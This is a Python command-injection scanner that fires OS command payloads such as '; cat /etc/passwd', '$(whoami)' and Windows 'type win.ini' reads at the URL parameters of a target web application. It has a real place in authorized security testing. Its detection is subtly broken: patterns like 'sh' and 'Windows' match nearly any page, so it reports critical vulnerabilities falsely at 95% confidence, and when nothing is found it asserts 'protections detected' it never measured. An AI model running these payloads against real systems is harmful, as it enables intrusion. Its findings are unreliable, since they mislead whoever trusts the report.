"""
Command Injection Tester v1.0
Auto-detección de parámetros vulnerables a inyección de comandos
Compatible con Linux y Windows
"""

import requests
import re
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CommandInjectionTester:
    """
    Scanner para Command Injection
    v1.0 - Auto-detección de parámetros
    """

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
        )

        # Parámetros comunes vulnerables a Command Injection
        self.common_parameters = [
            "cmd",
            "command",
            "exec",
            "execute",
            "ping",
            "query",
            "jump",
            "code",
            "reg",
            "do",
            "func",
            "arg",
            "option",
            "load",
            "process",
            "step",
            "read",
            "function",
            "req",
            "request",
            "feature",
            "exe",
            "module",
            "payload",
            "run",
            "print",
        ]

        # Payloads para Linux
        self.linux_payloads = [
            # Command separators
            "; whoami",
            "| whoami",
            "|| whoami",
            "& whoami",
            "&& whoami",
            # Command substitution
            "`whoami`",
            "$(whoami)",
            # Time-based
            "; sleep 3",
            "| sleep 3",
            # File read
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ]

        # Payloads para Windows
        self.windows_payloads = [
            # Command separators
            "& whoami",
            "&& whoami",
            "| whoami",
            "|| whoami",
            # Time-based
            "& timeout /t 3",
            "&& timeout /t 3",
            # File read
            "& type C:\\Windows\\win.ini",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        # Combinar todos los payloads
        self.payloads = self.linux_payloads + self.windows_payloads

        # Patrones para detectar ejecución exitosa
        self.success_patterns = [
            # Linux
            r"uid=\d+",  # whoami/id output
            r"root:",  # /etc/passwd
            r"bash",
            r"sh",
            r"/bin/",
            r"/home/",
            # Windows
            r"Windows",
            r"System32",
            r"Program Files",
            r"[A-Z]:\\",
            r"COMPUTERNAME",
            # Generic
            r"for 16-bit app support",  # win.ini
            r"localhost",
            r"127\.0\.0\.1",
        ]

    def scan(self, url: str, parameter: str = None) -> Dict:
        """
        Escanea un parámetro buscando Command Injection
        Si no hay parámetro, prueba automáticamente con parámetros comunes
        """
        print(f"[*] Command Injection Tester v1.0")
        print(f"[*] Target: {url}")

        start_time = time.time()
        vulnerabilities = []
        total_requests = 0

        # Parse URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Determinar estrategia
        if params and parameter:
            # Caso 1: URL con parámetros + parámetro específico
            if parameter in params:
                params_to_test = [parameter]
                print(f"[*] Testing parameter: {parameter}")
            else:
                return {
                    "vulnerable": False,
                    "error": f'Parameter "{parameter}" not found in URL',
                }

        elif params:
            # Caso 2: URL con parámetros, probar el primero
            params_to_test = [list(params.keys())[0]]
            print(f"[*] Testing parameter: {params_to_test[0]}")

        else:
            # Caso 3: URL sin parámetros - AUTO-DETECCIÓN
            print(f"[*] No parameters in URL")
            print(f"[*] Auto-testing common Command Injection parameters...")
            print(
                f"[*] Parameters to test: {', '.join(self.common_parameters[:5])} (+{len(self.common_parameters)-5} more)"
            )
            print()

            return self._auto_scan(parsed)

        print(f"[*] Scanning for: Command Injection")
        print()

        # Escaneo normal (con parámetros)
        for param in params_to_test:
            print(f"[*] Testing parameter: {param}")

            # Baseline request (sin payload)
            baseline_response = None
            try:
                baseline_url = self._build_url(parsed, {param: ["test"]})
                baseline_response = self.session.get(
                    baseline_url, timeout=self.timeout, verify=False
                )
                total_requests += 1
            except:
                pass

            # Test payloads
            for payload in self.payloads:
                print(f"  [*] Testing: {payload[:30]}...")

                test_params = params.copy()
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)

                try:
                    start_req = time.time()
                    response = self.session.get(
                        test_url, timeout=self.timeout, verify=False
                    )
                    duration = time.time() - start_req
                    total_requests += 1

                    # Check for successful execution
                    if self._check_command_execution(
                        response.text, payload, baseline_response, duration
                    ):
                        print(f"  [✓] COMMAND INJECTION VULNERABLE!")

                        vuln = self._create_vulnerability(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            response=response.text,
                            evidence=self._extract_evidence(response.text, payload),
                        )
                        vulnerabilities.append(vuln)
                        break

                except Exception as e:
                    continue

        duration = time.time() - start_time

        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "severity": self._calculate_severity(vulnerabilities),
            "confidence": 95 if vulnerabilities else 0,
            "scan_duration": duration,
            "total_requests": total_requests,
            "target": url,
            "parameters_tested": params_to_test,
        }

    def _auto_scan(self, parsed) -> Dict:
        """
        Auto-scan: Prueba parámetros comunes
        """
        start_time = time.time()
        vulnerabilities = []
        total_requests = 0
        tested_params = []

        # Probar cada parámetro común
        for param in self.common_parameters:
            tested_params.append(param)

            print(f"[*] Testing: ?{param}=...")

            # Baseline
            baseline_url = self._build_url(parsed, {param: ["test"]})
            baseline_response = None
            try:
                baseline_response = self.session.get(
                    baseline_url, timeout=self.timeout, verify=False
                )
                total_requests += 1
            except:
                pass

            # Probar solo algunos payloads para ser rápido
            test_payloads = [
                "; whoami",
                "| whoami",
                "& whoami",
                "; sleep 2",
            ]

            for payload in test_payloads:
                test_params = {param: [payload]}
                test_url = self._build_url(parsed, test_params)

                try:
                    start_req = time.time()
                    response = self.session.get(
                        test_url, timeout=self.timeout, verify=False
                    )
                    duration = time.time() - start_req
                    total_requests += 1

                    if self._check_command_execution(
                        response.text, payload, baseline_response, duration
                    ):
                        print(f"  [✓] VULNERABLE: ?{param}={payload[:20]}...")
                        print(f"  [!] Found vulnerable parameter: {param}")

                        vuln = self._create_vulnerability(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            response=response.text,
                            evidence=self._extract_evidence(response.text, payload),
                        )
                        vulnerabilities.append(vuln)

                        # Si encontramos vulnerabilidad, parar
                        break

                except Exception as e:
                    continue

            if vulnerabilities:
                print(f"\n[!] Vulnerability found, stopping auto-scan")
                break

        duration = time.time() - start_time

        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "severity": self._calculate_severity(vulnerabilities),
            "confidence": 95 if vulnerabilities else 0,
            "scan_duration": duration,
            "total_requests": total_requests,
            "target": self._build_url(parsed, {}),
            "parameters_tested": tested_params,
            "auto_scan": True,
            "scan_details": {
                "total_attempts": total_requests,
                "blocked_attempts": total_requests - len(vulnerabilities),
                "error_attempts": 0,
                "parameters_tested": [
                    {
                        "parameter": param,
                        "result": (
                            "blocked"
                            if not any(v["parameter"] == param for v in vulnerabilities)
                            else "vulnerable"
                        ),
                        "payloads_tested": 4,
                    }
                    for param in tested_params
                ],
            },
            "protection_analysis": {
                "security_rating": "Good" if not vulnerabilities else "Poor",
                "protections_detected": (
                    [
                        {
                            "type": "Input Validation",
                            "description": f"All {total_requests} command injection attempts were blocked",
                            "confidence": "High",
                            "evidence": "No command execution detected",
                        },
                        {
                            "type": "Command Filtering",
                            "description": "Special characters and separators appear to be filtered",
                            "confidence": "High",
                            "evidence": "Command separators (;|&) blocked",
                        },
                        {
                            "type": "Restricted Execution",
                            "description": "Server does not execute arbitrary system commands",
                            "confidence": "High",
                            "evidence": "No system command output detected",
                        },
                    ]
                    if not vulnerabilities
                    else []
                ),
                "statistics": {
                    "total_attempts": total_requests,
                    "blocked": total_requests - len(vulnerabilities),
                    "errors": 0,
                },
            },
        }

    def _build_url(self, parsed, params):
        """Construye URL con parámetros"""
        new_query = urlencode(params, doseq=True)
        return urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            )
        )

    def _check_command_execution(
        self, response_text: str, payload: str, baseline_response, duration: float
    ) -> bool:
        """Verifica si el comando fue ejecutado"""

        # Check 1: Success patterns
        for pattern in self.success_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True

        # Check 2: Time-based detection
        if "sleep" in payload.lower() or "timeout" in payload.lower():
            expected_delay = 2.0  # Esperamos al menos 2 segundos
            if duration >= expected_delay:
                return True

        # Check 3: Response length change
        if baseline_response:
            baseline_len = len(baseline_response.text)
            current_len = len(response_text)

            # Si la respuesta es significativamente diferente
            if abs(current_len - baseline_len) > 100:
                # Y contiene patrones de comando
                if any(
                    p in response_text.lower()
                    for p in ["root:", "uid=", "windows", "system32"]
                ):
                    return True

        return False

    def _extract_evidence(self, response_text: str, payload: str) -> str:
        """Extrae evidencia de la respuesta"""
        evidence_lines = []

        for line in response_text.split("\n")[:20]:
            for pattern in self.success_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    evidence_lines.append(line.strip())
                    if len(evidence_lines) >= 3:
                        break
            if len(evidence_lines) >= 3:
                break

        if evidence_lines:
            return " | ".join(evidence_lines[:3])
        else:
            return "Command execution detected (time-based or response anomaly)"

    def _create_vulnerability(
        self, url: str, parameter: str, payload: str, response: str, evidence: str
    ) -> Dict:
        """Crea objeto de vulnerabilidad"""
        return {
            "type": "Command Injection (OS Command Injection)",
            "url": url,
            "parameter": parameter,
            "payload": payload,
            "cvss_score": 9.8,
            "severity": "Critical",
            "cwe_id": "CWE-78",
            "cwe_name": "OS Command Injection",
            "mitre_technique_id": "T1059",
            "mitre_technique_name": "Command and Scripting Interpreter",
            "mitre_tactic": "Execution",
            "evidence": evidence,
            "impact": "Remote code execution, full system compromise, data theft",
            "remediation": "Never pass user input directly to system commands. Use parameterized APIs. Implement strict input validation.",
            "proof_of_concept": f'curl "{url}"',
        }

    def _calculate_severity(self, vulnerabilities: List[Dict]) -> str:
        """Calcula severidad general"""
        if not vulnerabilities:
            return "None"

        max_cvss = max(v["cvss_score"] for v in vulnerabilities)

        if max_cvss >= 9.0:
            return "Critical"
        elif max_cvss >= 7.0:
            return "High"
        elif max_cvss >= 4.0:
            return "Medium"
        else:
            return "Low"


def scan_command_injection(
    url: str, parameter: str = None, timeout: float = 10.0
) -> Dict:
    """Función wrapper para Berebrum"""
    scanner = CommandInjectionTester(timeout=timeout)
    return scanner.scan(url, parameter)
